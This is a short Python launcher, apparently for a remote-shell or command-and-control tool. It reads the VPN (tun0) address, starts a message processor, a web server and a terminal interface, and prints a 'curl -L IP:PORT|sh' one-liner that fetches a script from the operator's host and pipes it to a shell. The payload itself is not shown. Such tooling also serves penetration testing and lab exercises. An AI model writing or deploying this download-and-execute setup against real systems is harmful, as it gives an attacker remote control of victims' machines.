import netifaces

import message_processor
import web_server
import terminal

try:
    web_server.LOCAL_IP = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
except ValueError:
    pass  # tun0 not found, keep localhost

message_processor.process_new_messages_forever()
web_server.start(False)

print(f'{"-" * 30}\ncurl -L {web_server.LOCAL_IP}:{web_server.PORT}|sh\n{"-" * 30}\n')
terminal.App()
